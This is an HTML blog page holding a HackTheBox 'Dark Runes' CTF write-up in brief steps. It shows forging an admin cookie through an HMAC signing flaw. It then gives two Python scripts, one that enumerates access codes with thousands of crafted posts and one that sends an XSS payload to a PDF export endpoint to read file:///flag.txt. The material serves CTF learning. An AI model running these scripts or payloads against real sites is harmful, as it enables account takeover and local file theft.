@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>HTB DARK RUNES WRITEUP | SYC</title>
+
+<meta
+    name="description"
+    content="Challenge Scenario Survivors find a battered laptop in the rubble. Powering it up, they discover a cryptic software interface from an ancient architecture firm, hinting a..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/HTB%20Dark%20Runes%20Writeup"
+>
+
+<meta
+    property="og:title"
+    content="HTB DARK RUNES WRITEUP | SYC"
+>
+
+<meta
+    property="og:description"
+    content="Challenge Scenario Survivors find a battered laptop in the rubble. Powering it up, they discover a cryptic software interface from an ancient architecture firm, hinting a..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/HTB%20Dark%20Runes%20Writeup"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="HTB DARK RUNES WRITEUP | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="Challenge Scenario Survivors find a battered laptop in the rubble. Powering it up, they discover a cryptic software interface from an ancient architecture firm, hinting a..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+HTB DARK RUNES WRITEUP
+</h1>
+
+<div class="article-meta">
+    HTB DARK RUNES WRITEUP.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*9QqfmzcIUK8zM7fMGMi-WQ.png" /></p>
+<h4>Challenge Scenario</h4>
+<hr />
+<p>Survivors find a battered laptop in the rubble. Powering it up, they discover a cryptic software interface from an ancient architecture firm, hinting at vital blueprints. They must crack its security protocols. Undeterred, they race against time.</p>
+<p>check the website</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*3WJugxkFwd_pkBgfr_tMDg.png" /></p>
+<p>and zipfile</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*jRwKf8rkCsgRM_TFb6IOBg.png" /></p>
+<p>so register and login</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*MaecsZRRt077EtTzBD-RaQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*T9JGgaSmUmA2B1ENDE6WVA.png" /></p>
+<p>we can make documents</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Mpuw5eZ4ivz2JbUNwDuxCA.png" /></p>
+<p>maybe a xss</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*9sb2dbw2if8xg0yBzioq3w.png" /></p>
+<p>but we need more useful way</p>
+<p>after check the zip</p>
+<p>check our cookie</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*43sFEUIsh4UmATsT2HmYww.png" /></p>
+<p>base64 and what?</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*HFYPodjytPGq1NxiVlIVnA.png" /></p>
+<blockquote>
+<p><strong>// 生成签名的核心函数<br />
+const signString = (s) =&gt;<br />
+ crypto.createHmac(“sha256”, SECRET).update(s).digest(“hex”);</strong></p>
+<p>**// 生成完整 Cookie<br />
+const generateCookie = (username, id) =&gt; {<br />
+ // 1. 将用户数据转为 JSON 并 Base64 编码<br />
+ const stringifiedUser = btoa(JSON.stringify({ username, id }));  </p>
+<p>// 2. 用 HMAC-SHA256 对编码后的字符串进行签名<br />
+ const sig = signString(stringifiedUser);  </p>
+<p>// 3. 组合：编码数据 + 分隔符 + 签名<br />
+ return <code>${stringifiedUser}-${sig}</code>;<br />
+};**</p>
+</blockquote>
+<p>signString,hum</p>
+<p>luckily，it also sign the file</p>
+<p>const sig = signString(stringifiedUser);</p>
+<p>so,</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*BG3mG3pFpD6S84QdgqYGeA.png" /></p>
+<p>got </p>
+<p>eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*5OhQrZMKd7bjuaB94saG1Q.png" /></p>
+<p>got </p>
+<p>4fb37fb08b1f71e1a46ce7e1ecac8cd31ad3fd01a0a7bfeca7b7ab5fb300c845</p>
+<p>so </p>
+<p>eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-4fb37fb08b1f71e1a46ce7e1ecac8cd31ad3fd01a0a7bfeca7b7ab5fb300c845</p>
+<p>wo got admin</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*qaNlSIIbQ8LCptrxuo4hKw.png" /></p>
+<p>but nothing happpened right?</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*lTguo7JvSsw6cTXig2AkKw.png" /></p>
+<p>check the export api</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Esxrf8BwU5EGB4XIU8FqNg.png" /></p>
+<p>check the logic and use the payload below</p>
+<blockquote>
+<p><strong><em>import requests<br />
+from threading import Thread, Lock<br />
+import math<br />
+import re</em></strong></p>
+<p><strong><em>BASE_URL = “http://154.57.164.69:30588"<br />
+USER_COOKIE = “eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9–304567d68bda68293484023b1b1c1910c90e2740036b98e77f87fb8284e3aa09”</em></strong></p>
+<p><strong><em>START = 0<br />
+END = 10000<br />
+NUM_THREADS = 12<br />
+ALL_IDS = {f”{i:04d}” for i in range(10000)}<br />
+found_ids = set()<br />
+lock = Lock()</em></strong></p>
+<p><strong><em>def post_documents(start, end):<br />
+ session = requests.Session()<br />
+ session.cookies.set(“user”, USER_COOKIE)<br />
+ for i in range(start, end):<br />
+ padded = f”{i:04}”<br />
+ print(f”[Thread {start}-{end}] Posting document {padded}”)<br />
+ DOCUMENT_CONTENT = f”<a style=’background-image: url(/*# sourceMappingURL={padded} */);’>@slonser</em></a>”<br />
+ try:<br />
+ doc_resp = session.post(f”{BASE_URL}/documents”, data={<br />
+ “content”: DOCUMENT_CONTENT<br />
+ }, allow_redirects=False, timeout=10)<br />
+ if doc_resp.status_code == 302:<br />
+ print(f”[+] {padded} posted successfully!”)<br />
+ else:<br />
+ print(f”[-] {padded} failed: {doc_resp.status_code} {doc_resp.text}”)<br />
+ except Exception as e:<br />
+ print(f”[!] Error posting {padded}: {e}”)_</strong></p>
+<p><strong><em>def fetch_all_documents():<br />
+ session = requests.Session()<br />
+ session.cookies.set(“user”, USER_COOKIE)<br />
+ res = session.get(f”{BASE_URL}/documents”).text<br />
+ with open(‘out.txt’, ‘w’) as f:<br />
+ f.write(res)<br />
+ return res.splitlines()</em></strong></p>
+<p><strong><em>def process_lines(lines):<br />
+ local_ids = set()<br />
+ pattern = re.compile(r’sourceMappingURL=(\d{4})’)<br />
+ for line in lines:<br />
+ local_ids.update(pattern.findall(line))<br />
+ with lock:<br />
+ found_ids.update(local_ids)</em></strong></p>
+<p><strong><em>def main():<br />
+ total = END — START<br />
+ chunk = math.ceil(total / NUM_THREADS)<br />
+ threads = []</em></strong></p>
+<p><strong><em>for i in range(NUM_THREADS):<br />
+ thread_start = START + i * chunk<br />
+ thread_end = min(START + (i + 1) * chunk, END)<br />
+ t = Thread(target=post_documents, args=(thread_start, thread_end))<br />
+ threads.append(t)<br />
+ t.start()</em></strong></p>
+<p><strong><em>for t in threads:<br />
+ t.join()</em></strong></p>
+<p><strong><em>lines = fetch_all_documents()</em></strong></p>
+<p><strong><em>chunk_size = len(lines) // NUM_THREADS<br />
+ threads = []</em></strong></p>
+<p><strong><em>for i in range(NUM_THREADS):<br />
+ start = i * chunk_size<br />
+ end = None if i == NUM_THREADS — 1 else (i + 1) * chunk_size<br />
+ t = Thread(target=process_lines, args=(lines[start:end],))<br />
+ threads.append(t)<br />
+ t.start()</em></strong></p>
+<p><strong><em>for t in threads:<br />
+ t.join()</em></strong></p>
+<p><strong><em>missing = sorted(ALL_IDS — found_ids)<br />
+ print(f”[+] Total found: {len(found_ids)}”)<br />
+ print(f”[+] Missing ({len(missing)}):”)<br />
+ for mid in missing:<br />
+ print(mid)</em></strong></p>
+<p><strong><em>if <strong>name</strong> == “<strong>main</strong>”:<br />
+ main()</em></strong></p>
+</blockquote>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*QROKBM8g2LAm_pJ8Lxhvrg.png" /></p>
+<p>because of the netwrok,but we still make the target to only six</p>
+<p>than use</p>
+<blockquote>
+<p><strong><em>#!/usr/bin/env python3<br />
+“””<br />
+并发测试6个候选访问码获取flag<br />
+“””</em></strong></p>
+<p><strong><em>import requests<br />
+import concurrent.futures<br />
+from concurrent.futures import ThreadPoolExecutor<br />
+import re<br />
+import sys</em></strong></p>
+<p><strong><em>BASE_URL = “http://154.57.164.69:30588"<br />
+USER_COOKIE = “eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9–304567d68bda68293484023b1b1c1910c90e2740036b98e77f87fb8284e3aa09”</em></strong></p>
+<p><strong><em># 6个缺失的访问码<br />
+CANDIDATES = [‘0485’, ‘1509’, ‘2324’, ‘4875’, ‘8330’, ‘9031’]</em></strong></p>
+<p><strong><em># SSRF payload读取flag<br />
+PAYLOAD = “””<script><br />
+xhr = new XMLHttpRequest();<br />
+xhr.onload = function() {<br />
+ document.write(this.responseText);<br />
+};<br />
+xhr.open(“GET”, “file:///flag.txt”);<br />
+xhr.send();<br />
+</script>”””</em></strong></p>
+<p>**_def test_code(code):<br />
+ “””测试单个访问码”””<br />
+ url = f”{BASE_URL}/document/debug/export”  </p>
+<p>headers = {<br />
+ “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36”,<br />
+ “Cookie”: f”user={USER_COOKIE}”,<br />
+ “Content-Type”: “application/x-www-form-urlencoded”<br />
+ }  </p>
+<p>data = {<br />
+ “access_pass”: code,<br />
+ “content”: PAYLOAD<br />
+ }  </p>
+<p>try:<br />
+ response = requests.post(url, headers=headers, data=data, timeout=30)  </p>
+<p># 检查是否成功返回内容<br />
+ if response.status_code == 200:<br />
+ content_length = len(response.content)<br />
+ print(f”[*] 测试码 {code}: HTTP 200, 大小 {content_length} bytes”)  </p>
+<p># 检查响应内容（可能是PDF或HTML）<br />
+ text_content = response.text  </p>
+<p># 直接搜索flag<br />
+ flag_pattern = r’HTB{[^}]+}’<br />
+ flags = re.findall(flag_pattern, text_content)<br />
+ if flags:<br />
+ print(f”\n🎉🎉🎉 成功！访问码: {code}”)<br />
+ print(f”🏁 FLAG: {flags[0]}”)<br />
+ return code, True, flags[0]  </p>
+<p># 保存PDF/文件<br />
+ filename = f”flag_{code}.pdf”<br />
+ with open(filename, “wb”) as f:<br />
+ f.write(response.content)  </p>
+<p># 如果内容较大，可能是PDF<br />
+ if content_length &gt; 1000:<br />
+ print(f” 📄 已保存到: {filename}”)<br />
+ # 尝试用简单方法提取PDF中的文本<br />
+ if b’HTB{‘ in response.content:<br />
+ match = re.search(rb’HTB{[^}]+}’, response.content)<br />
+ if match:<br />
+ flag = match.group(0).decode(‘utf-8’)<br />
+ print(f” 🏁 提取到FLAG: {flag}”)<br />
+ return code, True, flag  </p>
+<p>return code, False, None  </p>
+<p>elif response.status_code == 403:<br />
+ print(f”❌ 测试码 {code}: 403 Forbidden (错误密码)”)<br />
+ else:<br />
+ print(f”⚠️ 测试码 {code}: HTTP {response.status_code}”)  </p>
+<p>return code, False, None  </p>
+<p>except requests.exceptions.Timeout:<br />
+ print(f”⏰ 测试码 {code}: 超时”)<br />
+ except Exception as e:<br />
+ print(f”💥 测试码 {code}: 错误 — {str(e)[:50]}”)  </p>
+<p>return code, False, None_**</p>
+<p>*<em>_def main():<br />
+ print(“=”</em>70)<br />
+ print(“🎯 并发测试6个候选访问码”)<br />
+ print(f”📍 目标: {BASE_URL}”)<br />
+ print(f”🔑 候选码: {‘, ‘.join(CANDIDATES)}”)<br />
+ print(“=”*70)  </p>
+<p>success_code = None<br />
+ success_flag = None  </p>
+<p>with ThreadPoolExecutor(max_workers=6) as executor:<br />
+ futures = {executor.submit(test_code, code): code for code in CANDIDATES}  </p>
+<p>for future in concurrent.futures.as_completed(futures):<br />
+ code, found, flag = future.result()<br />
+ if found:<br />
+ success_code = code<br />
+ success_flag = flag<br />
+ # 取消其他任务<br />
+ for f in futures:<br />
+ f.cancel()<br />
+ break  </p>
+<p>print(“\n” + “=”*70)<br />
+ if success_code:<br />
+ print(f”✅ 成功！正确的访问码是: {success_code}”)<br />
+ print(f”🏆 FLAG: {success_flag}”)<br />
+ print(f”\n💡 也可以查看生成的PDF文件: flag_{success_code}.pdf”)<br />
+ else:<br />
+ print(“❌ 所有候选码都失败了”)<br />
+ print(“\n可能的原因:”)<br />
+ print(“ 1. 正确的访问码不在候选列表中”)<br />
+ print(“ 2. Cookie已过期或权限不足”)<br />
+ print(“ 3. payload被WAF过滤”)<br />
+ print(“ 4. 接口路径需要调整”)  </p>
+<p># 建议手动测试第一个候选码<br />
+ print(f”\n建议手动测试:”)<br />
+ print(f”curl -X POST {BASE_URL}/document/debug/export \”)<br />
+ print(f” -H ‘Cookie: user={USER_COOKIE}’ \”)<br />
+ print(f” -d ‘access_pass=0485&amp;content={PAYLOAD}’ \”)<br />
+ print(f” -v”)_**</p>
+<p><strong><em>if <strong>name</strong> == “<strong>main</strong>”:<br />
+ main()</em></strong></p>
+</blockquote>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*98HXl7_b4N3vYub4gToGbQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*v1tOLjWAvkicbyEZMW_-pg.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*a6Nye-aAkhMvmr5hUHC46A.png" /></p>
+<p>yes!</p>
+<p>HTB{F0rs33_3num3r3t3_F!nd_3XplOit}</p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: HTB DARK RUNES WRITEUP.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
